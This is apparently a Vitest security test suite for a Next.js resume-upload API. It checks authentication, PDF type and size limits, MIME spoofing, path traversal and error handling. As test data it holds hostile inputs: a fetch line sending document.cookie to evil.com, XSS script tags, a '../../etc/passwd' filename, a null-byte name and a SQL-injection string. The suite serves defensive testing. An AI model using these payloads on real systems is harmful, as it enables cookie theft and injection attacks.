/**
 * Security Tests: File Upload — Resume Endpoint
 *
 * Tests for:
 * - Authentication enforcement on GET and POST
 * - MIME type validation and spoofing (client-provided type, no magic bytes check)
 * - File size boundary validation
 * - Path traversal safety (upload path is hardcoded)
 * - Malicious/XSS filenames stored in metadata
 * - Missing file handling
 * - Storage and database error handling
 * - Upsert behavior on repeated uploads
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import { NextRequest, NextResponse } from 'next/server';

// ---------------------------------------------------------------------------
// Mocks
// ---------------------------------------------------------------------------

const mockAuthenticateRequest = vi.fn();
vi.mock('@/lib/server/auth', () => ({
  authenticateRequest: (...args: unknown[]) => mockAuthenticateRequest(...args),
}));

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

const DEFAULT_USER_ID = 'user-upload-123';

function createAuthSuccess(userId = DEFAULT_USER_ID) {
  const mockStorageUpload = vi.fn().mockResolvedValue({ error: null });
  const mockStorageFrom = vi.fn().mockReturnValue({ upload: mockStorageUpload });

  const mockChain = {
    from: vi.fn().mockReturnThis(),
    select: vi.fn().mockReturnThis(),
    eq: vi.fn().mockReturnThis(),
    single: vi.fn().mockResolvedValue({
      data: { student_id: userId, file_name: 'resume.pdf' },
      error: null,
    }),
    upsert: vi.fn().mockResolvedValue({ error: null }),
    storage: { from: mockStorageFrom },
  };

  mockAuthenticateRequest.mockResolvedValue({
    user: { id: userId, email: `${userId}@test.com` },
    supabase: mockChain,
    error: null,
  });

  return { mockChain, mockStorageUpload, mockStorageFrom };
}

function createAuthFailure() {
  mockAuthenticateRequest.mockResolvedValue({
    user: null,
    supabase: null,
    error: NextResponse.json({ error: 'Unauthorized' }, { status: 401 }),
  });
}

function createUploadRequest(
  file: File | null,
  additionalFields?: Record<string, string>,
): NextRequest {
  const formData = new FormData();
  if (file) {
    formData.append('file', file);
  }
  if (additionalFields) {
    for (const [key, value] of Object.entries(additionalFields)) {
      formData.append(key, value);
    }
  }
  return new NextRequest('http://localhost:3000/api/student/resume', {
    method: 'POST',
    body: formData,
  });
}

function createPdfFile(
  name: string,
  content: string | ArrayBuffer = 'PDF content',
  type = 'application/pdf',
  sizeOverride?: number,
): File {
  if (sizeOverride) {
    const buffer = new ArrayBuffer(sizeOverride);
    return new File([buffer], name, { type });
  }
  return new File([content], name, { type });
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe('Security: File Upload — Resume Endpoint', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  // =========================================================================
  // 1. Authentication
  // =========================================================================
  describe('Authentication enforcement', () => {
    it('GET without auth returns 401', async () => {
      createAuthFailure();
      const { GET } = await import('@/app/api/student/resume/route');
      const res = await GET();
      expect(res.status).toBe(401);
      const body = await res.json();
      expect(body.error).toBe('Unauthorized');
    });

    it('POST without auth returns 401', async () => {
      createAuthFailure();
      const { POST } = await import('@/app/api/student/resume/route');
      const file = createPdfFile('resume.pdf');
      const req = createUploadRequest(file);
      const res = await POST(req);
      expect(res.status).toBe(401);
      const body = await res.json();
      expect(body.error).toBe('Unauthorized');
    });

    it('GET with valid auth returns resume data', async () => {
      createAuthSuccess();
      const { GET } = await import('@/app/api/student/resume/route');
      const res = await GET();
      expect(res.status).toBe(200);
      const body = await res.json();
      expect(body.data).toEqual({
        student_id: DEFAULT_USER_ID,
        file_name: 'resume.pdf',
      });
    });

    it('POST with valid auth and valid PDF succeeds', async () => {
      createAuthSuccess();
      const { POST } = await import('@/app/api/student/resume/route');
      const file = createPdfFile('resume.pdf');
      const req = createUploadRequest(file);
      const res = await POST(req);
      expect(res.status).toBe(200);
      const body = await res.json();
      expect(body.success).toBe(true);
    });
  });

  // =========================================================================
  // 2. File type validation
  // =========================================================================
  describe('File type validation', () => {
    it('accepts file with type application/pdf', async () => {
      createAuthSuccess();
      const { POST } = await import('@/app/api/student/resume/route');
      const file = createPdfFile('resume.pdf', 'PDF content', 'application/pdf');
      const req = createUploadRequest(file);
      const res = await POST(req);
      expect(res.status).toBe(200);
    });

    it('rejects file with type text/html', async () => {
      createAuthSuccess();
      const { POST } = await import('@/app/api/student/resume/route');
      const file = createPdfFile('page.html', '<html></html>', 'text/html');
      const req = createUploadRequest(file);
      const res = await POST(req);
      expect(res.status).toBe(400);
      const body = await res.json();
      expect(body.error).toBe('Only PDF files are allowed');
    });

    it('rejects file with type application/javascript', async () => {
      createAuthSuccess();
      const { POST } = await import('@/app/api/student/resume/route');
      const file = createPdfFile('script.js', 'alert(1)', 'application/javascript');
      const req = createUploadRequest(file);
      const res = await POST(req);
      expect(res.status).toBe(400);
      const body = await res.json();
      expect(body.error).toBe('Only PDF files are allowed');
    });

    it('rejects file with type image/png', async () => {
      createAuthSuccess();
      const { POST } = await import('@/app/api/student/resume/route');
      const file = createPdfFile('image.png', 'PNG data', 'image/png');
      const req = createUploadRequest(file);
      const res = await POST(req);
      expect(res.status).toBe(400);
      const body = await res.json();
      expect(body.error).toBe('Only PDF files are allowed');
    });

    it('rejects file with type application/x-executable', async () => {
      createAuthSuccess();
      const { POST } = await import('@/app/api/student/resume/route');
      const file = createPdfFile('malware.exe', 'MZ binary', 'application/x-executable');
      const req = createUploadRequest(file);
      const res = await POST(req);
      expect(res.status).toBe(400);
      const body = await res.json();
      expect(body.error).toBe('Only PDF files are allowed');
    });

    it('rejects file with empty MIME type', async () => {
      createAuthSuccess();
      const { POST } = await import('@/app/api/student/resume/route');
      const file = createPdfFile('noType', 'some bytes', '');
      const req = createUploadRequest(file);
      const res = await POST(req);
      expect(res.status).toBe(400);
      const body = await res.json();
      expect(body.error).toBe('Only PDF files are allowed');
    });
  });

  // =========================================================================
  // 3. MIME type spoofing — documents lack of magic byte validation
  // =========================================================================
  describe('MIME spoofing (client-provided type, no magic bytes check)', () => {
    it('accepts HTML content disguised as application/pdf', async () => {
      const { mockStorageUpload } = createAuthSuccess();
      const { POST } = await import('@/app/api/student/resume/route');
      const htmlContent = '<html><body><script>alert("XSS")</script></body></html>';
      const file = createPdfFile('malicious.pdf', htmlContent, 'application/pdf');
      const req = createUploadRequest(file);
      const res = await POST(req);
      // Route only checks file.type — no magic bytes validation
      expect(res.status).toBe(200);
      expect(mockStorageUpload).toHaveBeenCalled();
    });

    it('accepts JavaScript content disguised as application/pdf', async () => {
      const { mockStorageUpload } = createAuthSuccess();
      const { POST } = await import('@/app/api/student/resume/route');
      const jsContent = 'const payload = () => { fetch("https://evil.com/steal", { method: "POST", body: document.cookie }); };';
      const file = createPdfFile('exploit.pdf', jsContent, 'application/pdf');
      const req = createUploadRequest(file);
      const res = await POST(req);
      expect(res.status).toBe(200);
      expect(mockStorageUpload).toHaveBeenCalled();
    });

    it('accepts EXE-like content disguised as application/pdf', async () => {
      const { mockStorageUpload } = createAuthSuccess();
      const { POST } = await import('@/app/api/student/resume/route');
      // MZ is the magic bytes for PE/EXE files
      const exeContent = 'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00';
      const file = createPdfFile('trojan.pdf', exeContent, 'application/pdf');
      const req = createUploadRequest(file);
      const res = await POST(req);
      expect(res.status).toBe(200);
      expect(mockStorageUpload).toHaveBeenCalled();
    });
  });

  // =========================================================================
  // 4. File size validation
  // =========================================================================
  describe('File size validation', () => {
    const FIVE_MB = 5 * 1024 * 1024;

    it('accepts file exactly at 5MB boundary', async () => {
      createAuthSuccess();
      const { POST } = await import('@/app/api/student/resume/route');
      const file = createPdfFile('exact5mb.pdf', '', 'application/pdf', FIVE_MB);
      const req = createUploadRequest(file);
      const res = await POST(req);
      expect(res.status).toBe(200);
    });

    it('rejects file at 5MB + 1 byte', async () => {
      createAuthSuccess();
      const { POST } = await import('@/app/api/student/resume/route');
      const file = createPdfFile('over5mb.pdf', '', 'application/pdf', FIVE_MB + 1);
      const req = createUploadRequest(file);
      const res = await POST(req);
      expect(res.status).toBe(400);
      const body = await res.json();
      expect(body.error).toBe('File size must be less than 5MB');
    });

    it('accepts zero-byte file (passes size check)', async () => {
      createAuthSuccess();
      const { POST } = await import('@/app/api/student/resume/route');
      const file = createPdfFile('empty.pdf', '', 'application/pdf');
      const req = createUploadRequest(file);
      const res = await POST(req);
      // Zero-byte file passes both type and size checks
      expect(res.status).toBe(200);
    });

    it('rejects extremely large file (100MB)', async () => {
      createAuthSuccess();
      const { POST } = await import('@/app/api/student/resume/route');
      const hundredMB = 100 * 1024 * 1024;
      const file = createPdfFile('huge.pdf', '', 'application/pdf', hundredMB);
      const req = createUploadRequest(file);
      const res = await POST(req);
      expect(res.status).toBe(400);
      const body = await res.json();
      expect(body.error).toBe('File size must be less than 5MB');
    });
  });

  // =========================================================================
  // 5. Path traversal safety
  // =========================================================================
  describe('Path traversal safety (upload path is hardcoded)', () => {
    it('filename ../../etc/passwd is stored in metadata but upload path is fixed', async () => {
      const { mockChain, mockStorageUpload } = createAuthSuccess();
      const { POST } = await import('@/app/api/student/resume/route');
      const file = createPdfFile('../../etc/passwd', 'PDF content', 'application/pdf');
      const req = createUploadRequest(file);
      const res = await POST(req);
      expect(res.status).toBe(200);
      // Upload path is always ${userId}/resume.pdf — no traversal
      expect(mockStorageUpload).toHaveBeenCalledWith(
        `${DEFAULT_USER_ID}/resume.pdf`,
        expect.any(File),
        { upsert: true, contentType: 'application/pdf' },
      );
      // file_name in metadata stores the original (malicious) name
      expect(mockChain.upsert).toHaveBeenCalledWith(
        { student_id: DEFAULT_USER_ID, file_name: '../../etc/passwd' },
        { onConflict: 'student_id' },
      );
    });

    it('filename ../malicious.pdf is stored in metadata but upload path is fixed', async () => {
      const { mockStorageUpload } = createAuthSuccess();
      const { POST } = await import('@/app/api/student/resume/route');
      const file = createPdfFile('../malicious.pdf', 'PDF content', 'application/pdf');
      const req = createUploadRequest(file);
      const res = await POST(req);
      expect(res.status).toBe(200);
      expect(mockStorageUpload).toHaveBeenCalledWith(
        `${DEFAULT_USER_ID}/resume.pdf`,
        expect.any(File),
        { upsert: true, contentType: 'application/pdf' },
      );
    });

    it('filename with null bytes is stored in metadata but upload path is unaffected', async () => {
      const { mockChain, mockStorageUpload } = createAuthSuccess();
      const { POST } = await import('@/app/api/student/resume/route');
      const file = createPdfFile('resume\x00.pdf', 'PDF content', 'application/pdf');
      const req = createUploadRequest(file);
      const res = await POST(req);
      expect(res.status).toBe(200);
      expect(mockStorageUpload).toHaveBeenCalledWith(
        `${DEFAULT_USER_ID}/resume.pdf`,
        expect.any(File),
        { upsert: true, contentType: 'application/pdf' },
      );
      expect(mockChain.upsert).toHaveBeenCalledWith(
        { student_id: DEFAULT_USER_ID, file_name: 'resume\x00.pdf' },
        { onConflict: 'student_id' },
      );
    });
  });

  // =========================================================================
  // 6. Malicious filenames in metadata
  // =========================================================================
  describe('Filename in metadata (stored as-is, potential XSS if rendered unescaped)', () => {
    it('stores very long filename (>1000 chars) without validation', async () => {
      const { mockChain } = createAuthSuccess();
      const { POST } = await import('@/app/api/student/resume/route');
      const longName = 'a'.repeat(1001) + '.pdf';
      const file = createPdfFile(longName, 'PDF content', 'application/pdf');
      const req = createUploadRequest(file);
      const res = await POST(req);
      expect(res.status).toBe(200);
      expect(mockChain.upsert).toHaveBeenCalledWith(
        { student_id: DEFAULT_USER_ID, file_name: longName },
        { onConflict: 'student_id' },
      );
    });

    it('stores XSS payload in filename as-is', async () => {
      const { mockChain } = createAuthSuccess();
      const { POST } = await import('@/app/api/student/resume/route');
      const xssName = '<script>alert(1)</script>.pdf';
      const file = createPdfFile(xssName, 'PDF content', 'application/pdf');
      const req = createUploadRequest(file);
      const res = await POST(req);
      expect(res.status).toBe(200);
      expect(mockChain.upsert).toHaveBeenCalledWith(
        { student_id: DEFAULT_USER_ID, file_name: xssName },
        { onConflict: 'student_id' },
      );
    });

    it('stores SQL injection patterns in filename as-is (parameterized queries prevent injection)', async () => {
      const { mockChain } = createAuthSuccess();
      const { POST } = await import('@/app/api/student/resume/route');
      const sqliName = "'; DROP TABLE resume; --.pdf";
      const file = createPdfFile(sqliName, 'PDF content', 'application/pdf');
      const req = createUploadRequest(file);
      const res = await POST(req);
      expect(res.status).toBe(200);
      expect(mockChain.upsert).toHaveBeenCalledWith(
        { student_id: DEFAULT_USER_ID, file_name: sqliName },
        { onConflict: 'student_id' },
      );
    });
  });

  // =========================================================================
  // 7. No file provided
  // =========================================================================
  describe('Missing file handling', () => {
    it('returns 400 when FormData has no file field', async () => {
      createAuthSuccess();
      const { POST } = await import('@/app/api/student/resume/route');
      const req = createUploadRequest(null);
      const res = await POST(req);
      expect(res.status).toBe(400);
      const body = await res.json();
      expect(body.error).toBe('No file provided');
    });

    it('returns 400 when FormData has file field as empty string', async () => {
      createAuthSuccess();
      const { POST } = await import('@/app/api/student/resume/route');
      // Append a non-File value — `formData.get('file') as File` will be a string, not a File
      const formData = new FormData();
      formData.append('file', '');
      const req = new NextRequest('http://localhost:3000/api/student/resume', {
        method: 'POST',
        body: formData,
      });
      const res = await POST(req);
      // Empty string is falsy in JS — route checks `if (!file)`
      expect(res.status).toBe(400);
      const body = await res.json();
      expect(body.error).toBe('No file provided');
    });
  });

  // =========================================================================
  // 8. Upload error handling
  // =========================================================================
  describe('Upload error handling', () => {
    it('returns 500 when storage upload fails', async () => {
      const { mockStorageUpload } = createAuthSuccess();
      mockStorageUpload.mockResolvedValue({
        error: { message: 'Storage quota exceeded' },
      });
      const { POST } = await import('@/app/api/student/resume/route');
      const file = createPdfFile('resume.pdf');
      const req = createUploadRequest(file);
      const res = await POST(req);
      expect(res.status).toBe(500);
      const body = await res.json();
      expect(body.error).toBe('Failed to upload resume');
    });

    it('returns 500 when database upsert fails', async () => {
      const { mockChain } = createAuthSuccess();
      mockChain.upsert.mockResolvedValue({
        error: { message: 'Database constraint violation' },
      });
      const { POST } = await import('@/app/api/student/resume/route');
      const file = createPdfFile('resume.pdf');
      const req = createUploadRequest(file);
      const res = await POST(req);
      expect(res.status).toBe(500);
      const body = await res.json();
      expect(body.error).toBe('Failed to save resume metadata');
    });
  });

  // =========================================================================
  // 9. Multiple uploads — upsert behavior
  // =========================================================================
  describe('Multiple uploads (upsert, no duplicates)', () => {
    it('second upload upserts to same path with upsert: true', async () => {
      const { mockStorageUpload, mockChain } = createAuthSuccess();
      const { POST } = await import('@/app/api/student/resume/route');

      // First upload
      const file1 = createPdfFile('resume_v1.pdf');
      const req1 = createUploadRequest(file1);
      const res1 = await POST(req1);
      expect(res1.status).toBe(200);

      // Second upload
      const file2 = createPdfFile('resume_v2.pdf');
      const req2 = createUploadRequest(file2);
      const res2 = await POST(req2);
      expect(res2.status).toBe(200);

      // Both uploads target the same path
      expect(mockStorageUpload).toHaveBeenCalledTimes(2);
      for (const call of mockStorageUpload.mock.calls) {
        expect(call[0]).toBe(`${DEFAULT_USER_ID}/resume.pdf`);
        expect(call[2]).toEqual({ upsert: true, contentType: 'application/pdf' });
      }

      // Both metadata upserts use onConflict: 'student_id'
      expect(mockChain.upsert).toHaveBeenCalledTimes(2);
      for (const call of mockChain.upsert.mock.calls) {
        expect(call[1]).toEqual({ onConflict: 'student_id' });
      }
    });
  });
});
